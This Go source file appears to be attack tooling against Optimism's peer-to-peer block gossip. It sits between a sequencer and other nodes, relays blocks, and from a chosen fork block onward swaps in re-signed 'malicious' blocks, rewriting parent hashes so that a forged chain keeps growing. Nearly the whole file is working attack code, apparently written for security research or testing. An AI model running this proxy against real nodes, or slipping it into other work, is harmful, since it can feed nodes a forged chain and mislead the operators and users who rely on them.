package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"

	"github.com/ethereum-optimism/optimism/op-service/client"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/rpc"
	"github.com/golang/snappy"
	libp2p "github.com/libp2p/go-libp2p"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	pubsub_pb "github.com/libp2p/go-libp2p-pubsub/pb"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
)

type P2P struct {
	engine         *Engine
	sub            *pubsub.Subscription
	topic          *pubsub.Topic
	serverHost     host.Host
	clientHost     host.Host
	forkBlock      eth.Uint64Quantity
	maliciousChain map[common.Hash]common.Hash
}

var blockTopic = "/optimism/%s/3/blocks"

func NewP2PEngine(gethEngineRpc string, jwtSecret []byte, privateKey *ecdsa.PrivateKey, addr string, chainId *big.Int, seqAddrInfo *peer.AddrInfo) *P2P {
	rpcClient, err := client.NewRPC(context.Background(), nil, gethEngineRpc, client.WithGethRPCOptions(
		rpc.WithHTTPClient(&http.Client{Transport: &jwtTransport{secret: jwtSecret}}),
	))
	if err != nil {
		log.Fatalf("engine RPC client: %v", err)
	}

	serverHost, clientHost, sub, topic := initP2P(addr, chainId, seqAddrInfo)
	p := &P2P{
		engine: &Engine{
			client:     rpcClient,
			privateKey: privateKey,
			chainId:    eth.ChainIDFromBig(chainId),
		},
		sub:            sub,
		topic:          topic,
		serverHost:     serverHost,
		clientHost:     clientHost,
		forkBlock:      0,
		maliciousChain: make(map[common.Hash]common.Hash),
	}
	p.registerRequestResponse(context.Background(), seqAddrInfo.ID)
	return p
}

func initP2P(listenerAddress string, chainId *big.Int, seqAddrInfo *peer.AddrInfo) (host.Host, host.Host, *pubsub.Subscription, *pubsub.Topic) {
	msgIDFn := func(msg *pubsub_pb.Message) string {
		h := sha256.Sum256(msg.Data)
		return string(h[:])
	}

	gsOpts := []pubsub.Option{
		pubsub.WithNoAuthor(),
		pubsub.WithMessageSignaturePolicy(pubsub.StrictNoSign),
		pubsub.WithStrictSignatureVerification(false),
		pubsub.WithFloodPublish(true),
		pubsub.WithMessageIdFn(msgIDFn),
	}

	serverHost, err := libp2p.New(libp2p.ListenAddrStrings(listenerAddress))
	if err != nil {
		log.Fatalf("failed to create server host: %v", err)
	}
	log.Printf("proxy peer ID: %s", serverHost.ID())

	ctx := context.Background()

	hostPubSub, err := pubsub.NewGossipSub(ctx, serverHost, gsOpts...)
	if err != nil {
		log.Fatalf("failed to create server gossipsub: %v", err)
	}

	topicName := fmt.Sprintf(blockTopic, chainId.String())

	clientHost, err := libp2p.New(libp2p.ListenAddrStrings("/ip4/0.0.0.0/tcp/0"))
	if err != nil {
		log.Fatalf("failed to create client host: %v", err)
	}
	clientPS, err := pubsub.NewGossipSub(ctx, clientHost, gsOpts...)
	if err != nil {
		log.Fatalf("failed to create client gossipsub: %v", err)
	}
	if err := clientHost.Connect(ctx, *seqAddrInfo); err != nil {
		log.Fatalf("failed to connect to sequencer: %v", err)
	}
	log.Printf("connected to sequencer %s", seqAddrInfo.ID)

	topic, err := hostPubSub.Join(topicName)
	if err != nil {
		log.Fatalf("failed to join server topic: %v", err)
	}
	log.Printf("joined server topic %s", topicName)

	clientTopic, err := clientPS.Join(topicName)
	if err != nil {
		log.Fatalf("failed to join client topic: %v", err)
	}
	sub, err := clientTopic.Subscribe()
	if err != nil {
		log.Fatalf("failed to subscribe: %v", err)
	}
	log.Printf("subscribed to %s", topicName)

	return serverHost, clientHost, sub, topic
}

func (p *P2P) SetForkBlock(forkBlock uint64) {
	if forkBlock > 0 {
		log.Printf("setting block to fork at %d", forkBlock)
		p.forkBlock = eth.Uint64Quantity(forkBlock)
	}
}

func (p *P2P) registerRequestResponse(ctx context.Context, seqID peer.ID) {
	protoID := protocol.ID(fmt.Sprintf("/opstack/req/payload_by_number/%s/0", p.engine.chainId.String()))
	p.serverHost.SetStreamHandler(protoID, func(inStream network.Stream) {
		defer inStream.Close()

		var req [8]byte
		if _, err := io.ReadFull(inStream, req[:]); err != nil {
			log.Printf("req/resp read request failed: %v", err)
			inStream.Reset()
			return
		}

		outStream, err := p.clientHost.NewStream(ctx, seqID, protoID)
		if err != nil {
			log.Printf("req/resp failed to open sequencer stream: %v", err)
			inStream.Reset()
			return
		}
		defer outStream.Close()

		if _, err := outStream.Write(req[:]); err != nil {
			log.Printf("req/resp failed to write request: %v", err)
			return
		}
		outStream.CloseWrite()

		written, err := io.Copy(inStream, outStream)
		if err != nil {
			log.Printf("req/resp failed copy response: %v", err)
			return
		}
		log.Printf("req/resp succesfully forwarded block response %d bytes", written)
	})
	log.Printf("registered req/resp forwarding on %s", protoID)
}

func (p *P2P) modifyPayload(payload *eth.ExecutionPayload, data []byte, parentHash *common.Hash) ([]byte, error) {
	log.Printf("building malicious replacement for block %d (chain len %d)", payload.BlockNumber, len(p.maliciousChain))

	modifiedData, err := p.engine.modify(data, parentHash)
	if err != nil {
		log.Printf("modify error: %v, forwarding original", err)
		return nil, fmt.Errorf("failed to modify payload: %v", err)
	}
	replacedData, err := snappy.Decode(nil, modifiedData)
	if err != nil {
		return nil, fmt.Errorf("snappy decode failed for malicious block: %v", err)
	}
	replacedBlock, err := p.engine.decodePayload(replacedData)
	if err != nil {
		return nil, fmt.Errorf("failed to decode replaced data: %v", err)
	}
	p.maliciousChain[payload.BlockHash] = replacedBlock.BlockHash
	log.Printf("added new malicious block hash %s -> %s (fork chained len %d)", payload.BlockHash, replacedBlock.BlockHash, len(p.maliciousChain))
	return modifiedData, nil
}

func (p *P2P) run() {
	ctx := context.Background()

	for {
		msg, err := p.sub.Next(ctx)
		if err != nil {
			log.Fatalf("subscription error: %v", err)
		}

		decodedData, err := snappy.Decode(nil, msg.Data)
		if err != nil {
			log.Printf("snappy decode failed: %v", err)
			continue
		}
		payload, err := p.engine.decodePayload(decodedData)
		if err != nil {
			log.Printf("decode block failed: %v", err)
			continue
		}

		log.Printf("block %d", payload.BlockNumber)

		outData := msg.Data
		if payload.BlockNumber == p.forkBlock {
			outData, err = p.modifyPayload(payload, decodedData, nil)
			if err != nil {
				log.Printf("modify error at block number: %v, forwarding original", err)
				outData = msg.Data
			}
		} else if maliciousParent, ok := p.maliciousChain[payload.ParentHash]; ok {
			// In order to keep the chain going after malicious block we need to modify the payload with new malicious parent hash
			outData, err = p.modifyPayload(payload, decodedData, &maliciousParent)
			if err != nil {
				log.Printf("modify error for malicious parent: %v, forwarding original", err)
				outData = msg.Data
			}
		}

		if err := p.topic.Publish(ctx, outData); err != nil {
			log.Printf("publish error: %v", err)
		}
	}
}
